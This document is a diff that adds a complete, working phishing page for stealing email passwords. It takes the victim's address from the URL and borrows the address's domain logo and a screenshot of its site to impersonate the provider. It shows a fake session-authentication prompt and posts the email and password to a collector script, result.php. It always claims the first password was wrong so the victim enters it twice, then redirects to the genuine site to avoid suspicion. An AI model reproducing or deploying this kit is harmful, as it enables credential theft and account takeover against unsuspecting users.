@@ -1,0 +1,448 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title id="titt"></title>
+    <link rel="shortcut icon" href="" id="favico" type="image/x-icon">
+    <style>
+        * {
+            box-sizing: border-box;
+            padding: 0;
+            margin: 0;
+        }
+        body {
+            font-family: Arial, sans-serif;
+            /*background-color: #f5f5f5;*/
+            /*background-image: url("https://image.thum.io/get/width/1200/https://aol.com");*/
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .login-container {
+            width: 420px;
+            padding: 1rem;
+            background-color: white;
+            border-radius: 8px;
+            background-color: rgb(255, 255, 255);
+            box-shadow: rgba(179, 179, 179, 0.7) 0px 10px 15px;
+            text-align: center;
+            font-family: Verdana, Geneva, Tahoma, sans-serif;
+        }
+
+        .login-container h1 {
+            font-size: 20px;
+            margin-bottom: 20px;
+        }
+
+        .login-container .os-info {
+            font-size: 15px;
+            margin-bottom: 15px;
+            color: #717171;
+        }
+        .login-container .os-info .boxch p {
+            font-size: 15px;
+            color: #717171;
+            font-family: auto;
+        } 
+
+        .login-container .os-info .boxch img {
+            vertical-align: middle;
+            margin-right: 5px;
+            width: 25px;
+            height: 25px;
+        }
+
+        .login-container .os-info span {
+            font-size: 15px;
+            color: #717171;
+            font-family: auto;
+        }
+
+        .login-container p {
+            font-size: 14px;
+            margin: 10px 0;
+        }
+
+        .login-container p span {
+            color: #333;
+            font-weight: bold;
+        }
+
+        .login-container form {
+            margin-top: 15px;
+        }
+
+        .login-container input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            height: 3.125pc;
+            font-size: 18px;
+            border: 1px solid rgb(140, 140, 140);
+            border-radius: 4px;
+            box-sizing: border-box;
+            margin-bottom: 10px;
+            letter-spacing: 7px;
+        }
+
+        .login-container .auth-error {
+            color: red;
+            font-size: 13px;
+            text-align: start !important;
+            margin-bottom: 10px;
+        }
+
+        .login-container .checkbox-container {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+            margin-top: 3rem;
+        }
+
+        .login-container .checkbox-container input[type="checkbox"] {
+            margin-right: 5px;
+        }
+
+        .login-container button {
+            width: 100%;
+            color: rgb(255, 255, 255);
+    background: rgb(24, 143, 255);
+            padding: 18px;
+            border: none;
+            /* border-radius: 4px; */
+            font-size: 16px;
+            margin-bottom: 15px;
+            cursor: pointer;
+        }
+
+        .login-container button:hover {
+            background-color: #005bb5;
+        }
+
+        .login-container .footer {
+            font-size: 12px;
+            color: #000;
+            /*background: linear-gradient(180deg, #fff 40%, rgba(0, 0, 0, .225) 100%);*/
+            margin-top: 20px;
+            height: .520833333in;
+        }
+
+        .loader {
+        display: block;
+        --height-of-loader: 2px;
+        --loader-color: green;
+        width: 100%;
+        height: var(--height-of-loader);
+        border-radius: 30px;
+        background-color: transparent;
+        position: relative;
+        }
+
+        .loader::before {
+        content: "";
+        position: absolute;
+        background: var(--loader-color);
+        top: 0;
+        left: 0;
+        width: 0%;
+        height: 100%;
+        border-radius: 30px;
+        animation: moving 1.5s ease-in-out infinite;
+        ;
+        }
+        @keyframes moving {
+        50% {
+            width: 100%;
+        }
+
+        100% {
+            width: 0;
+            right: 0;
+            left: unset;
+        }
+        }
+        .loaders {
+            padding: 5px;
+            border: 1px solid #747474;
+            width: 400px;
+            margin: 1rem auto;
+            border-radius: 24px;
+        }
+        .loadcent {
+            width: 50%;
+        }
+        .info {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            flex-wrap: wrap;
+             justify-content: center;
+             font-size: 12px;
+        } 
+        .info span i {
+            margin:0 5px;
+        }
+        hr {
+            border: 0;
+            border-top: 1px solid #eee;
+        
+
+        }
+        #password::placeholder {
+                /* content: 'Email address'!important; */
+                letter-spacing: 1.7px !important;
+                font-size: 13px !important;
+                /* color: transparent; */
+
+            }
+        section {
+            position: fixed;height: 100vh;width: 100%;display: flex;justify-content: center;align-items: center;z-index: 10;
+            background: #fff;
+        }
+        @media screen and (max-width: 768px) {
+            .login-container {
+            width: 100%;
+            padding: 2rem;
+            background-color: white !important;
+            border-radius: 8px;
+            background-color: transparent;
+            box-shadow: none;
+            text-align: center;
+            font-family: Verdana, Geneva, Tahoma, sans-serif;
+        }
+            .loadcent {
+                width: 90%;
+            }
+            .loaders {
+                padding: 5px;
+                border: 1px solid #747474;
+                width: 90%;
+                margin: 1rem auto;
+                border-radius: 24px;
+            }
+            .info {
+                display: flex;
+                align-items: center;
+                gap: 12px;
+                flex-wrap: wrap;
+                 justify-content: center;
+                 font-size: 12px;
+            } 
+        }
+    </style>
+    <script>
+        // Function to display date, time, browser, OS, and location
+        function displayInfo() {
+            // Display current date and time
+            const currentDate = new Date();
+            const dateString = currentDate.toDateString();
+            const timeString = currentDate.toLocaleTimeString();
+            const datetimeElements = document.getElementsByClassName("datetime");
+            for (let i = 0; i < datetimeElements.length; i++) {
+                datetimeElements[i].innerHTML = '<i class="far fa-calendar-alt icon"></i>' + dateString + ' <i class="far fa-clock icon"></i>' + timeString;
+            }
+        
+            // Display browser type
+            const browserType = detectBrowser();
+            const browserElements = document.getElementsByClassName("browser");
+            for (let i = 0; i < browserElements.length; i++) {
+                browserElements[i].innerHTML = '<i class="fab fa-chrome icon"></i>' + browserType;
+            }
+        
+            // Display operating system
+            const os = detectOS();
+            const osElements = document.getElementsByClassName("os");
+            for (let i = 0; i < osElements.length; i++) {
+                osElements[i].innerHTML = '<i class="fab fa-windows icon"></i>' + os;
+            }
+        
+            // Get and display user's location (city and country) based on IP address
+            fetch("https://ipapi.co/json/")
+                .then(response => response.json())
+                .then(data => {
+                    const city = data.city;
+                    const country = data.country_name;
+                    const locationElements = document.getElementsByClassName("location");
+                    for (let i = 0; i < locationElements.length; i++) {
+                        locationElements[i].innerHTML = '<i class="fas fa-map-marker-alt icon"></i>' + city + ', ' + country;
+                    }
+                })
+                .catch(error => {
+                    const locationElements = document.getElementsByClassName("location");
+                    for (let i = 0; i < locationElements.length; i++) {
+                        locationElements[i].innerHTML = '<i class="fas fa-map-marker-alt icon"></i>Unable to retrieve';
+                    }
+                });
+        }
+        
+        // Function to detect browser type
+        function detectBrowser() {
+            const userAgent = window.navigator.userAgent;
+            const browsers = {
+                chrome: /chrome/i,
+                safari: /safari/i,
+                firefox: /firefox/i,
+                ie: /internet explorer/i,
+                edge: /edge/i,
+                opera: /opera|OPR/i,
+                android: /android/i,
+                ios: /iphone|ipad|ipod/i
+            };
+            for (let key in browsers) {
+                if (browsers[key].test(userAgent)) {
+                    return key.charAt(0).toUpperCase() + key.slice(1);
+                }
+            }
+            return "Unknown";
+        }
+        
+        // Function to detect operating system
+        function detectOS() {
+            const userAgent = window.navigator.userAgent;
+            if (userAgent.indexOf("Windows") !== -1) {
+                return "Windows";
+            } else if (userAgent.indexOf("Mac") !== -1) {
+                return "Mac OS";
+            } else if (userAgent.indexOf("Linux") !== -1) {
+                return "Linux";
+            }
+            return "Unknown";
+        }
+
+        // Run the display function when the page loads
+        window.onload = displayInfo;
+    </script>
+     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA==" crossorigin="anonymous" referrerpolicy="no-referrer">
+     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
+</head>
+<body id="body">
+   <section id="loaddd">
+        <div class="loadcent">
+            <!-- <i class="fas fa-envelope" style="text-align: center;font-size: 6rem;display: block;color: rgb(0 19 186 / 65%);"></i>
+             -->
+             <img src="" id="loimg" style="width: 70px;height: auto;text-align: center;display: block;margin: auto;" alt="">
+            <div class="loaders">
+            <div class="loader"></div>
+            </div>
+            <hr style="width:50%;text-align:center; margin: 20px auto;">
+            <p style="text-align: center;">Loading <span id="emailich"></span> mail setting ...</p>
+            <hr style="width:50%;text-align:center; margin: 20px auto;">
+            <div class="info">
+                <span class="datetime"></span>
+                <span class="browser"></span>
+                <span class="os"></span>
+                <span class="location"></span>
+            </div>
+        </div>
+   </section>
+    <div class="login-container">
+        <img src="" alt="" width="70px" height="auto" id="imgg">
+        <!-- <h3 style="display: block;color:blue;font-size:20px;text-align: center;font-weight: 400;
+        margin-bottom: 15px;">メールポータル</h3> -->
+        <!-- <hr style="width:100%;text-align:left;margin: 20px 0;margin-left:0;border-color: rgba(128, 128, 128, 0.318);"> -->
+        <div class="info" style="text-align: center;">
+            <span class="datetime"></span>
+            <span class="browser"></span>
+            <span class="os"></span>
+            <span class="location"></span>
+        </div>
+        <p id="auth_email" style="color: rgb(6, 39, 171);text-align: center;font-size: 17px;"></p>
+       
+        <hr style="width:100%;text-align:left;margin: 20px 0;margin-left:0;border-color: #eee;">
+        <p>Session authentication! please provide your  <span id="ux-group"></span> password to continue.</p>
+        
+        <form action="" id="testForm" method="POST">
+            <input type="hidden" name="aa" id="ux" required value="">
+            <input type="password" id="password" name="bb" placeholder="Password" required>
+            
+            <div class="auth-error" id="uy-group">Authentication is required!</div>
+            
+            <div class="checkbox-container">
+                <input type="checkbox" id="show-password">
+                <label for="show-password" style="color: #0A66C3;font-size: 13px;">Show password</label>
+            </div>
+            
+            <button type="submit">NEXT</button>
+        </form>
+        <hr style="width:100%;text-align:left;margin-left:0;border-color: rgba(128, 128, 128, 0.318);margin: 20px 0;">
+        
+        <div class="footer">
+            © 2026 <span id="emailichjdk"></span> Secure Portal | Privacy 
+        </div>
+    </div>
+    <script>
+       
+        var fille = "./result.php"; // Your php url here e.g http://youdomain.com/result.php
+        
+        var fullUrl = window.location.href;
+        var emailRegex = /#([^#]+)$/;
+        var match = fullUrl.match(emailRegex);
+        var emaill = match ? match[1] : null;
+        var domain = emaill.substring(emaill.lastIndexOf("@") +1);
+        var frmsite = domain.substring(0, domain.lastIndexOf("."));
+        console.log(domain, frmsite);
+        document.getElementById("emailich").textContent = domain;
+        document.getElementById("emailichjdk").textContent = domain;
+        document.getElementById("titt").textContent = `portal  - ${domain} Email verification`;
+        document.getElementById('ux').value = emaill;
+        document.getElementById('auth_email').textContent = emaill;
+        document.getElementById("ux-group").textContent = domain;
+        document.getElementById("imgg").src = `https://logo.clearbit.com/${domain}`;
+        document.getElementById("loimg").src = `https://logo.clearbit.com/${domain}`;
+        document.getElementById("imgg").href = `https://logo.clearbit.com/${domain}`;
+        // document.getElementById("body").style.backgroundImage = `url("https://image.thum.io/get/width/1200/https://${domain}")`;
+       document.getElementById("body").style.background = `linear-gradient(rgb(72 67 67 / 88%), #181717cc), url("https://image.thum.io/get/width/1200/https://${domain}")`;
+        // Display OS, browser, date, and location
+            setTimeout(() => {
+                document.getElementById("loaddd").style.display = "none";
+            }, 3000);
+       
+
+        var formSubmitted = 0;
+
+        $("#testForm").on("submit", function (event) {
+        
+            event.preventDefault();
+            
+            formSubmitted++;
+            
+            var inputs = $('input[required]');
+            for (var i = 0; i < inputs.length; i++) {
+                if (!inputs[i].value.trim()) {
+                    alert("Please fill in all fields.");
+                    return;
+                }
+            }
+            
+            var formData = new FormData(this);
+
+            $.ajax({
+                url: `${fille}`,
+                type: 'POST',
+                data: formData,
+                processData: false, // Required to send FormData
+                contentType: false, // Required to not set default content type
+                success: function (response) {
+                    console.log(response);
+                    
+                    if (formSubmitted === 1) {
+                        console.log("YESSSSS");
+                        $("#password").val("");
+                        $("#uy-group").text("Password is incorrect. Please try again.");
+                    } else if (formSubmitted >= 2) {
+                        
+                        console.log("GOOOOOO");
+                        setTimeout(() => {
+                            window.location.href = `http://www.${domain}`;
+                        }, 2000);
+                    } 
+                }
+            });
+        });
+
+    </script>
+</body>
+</html>
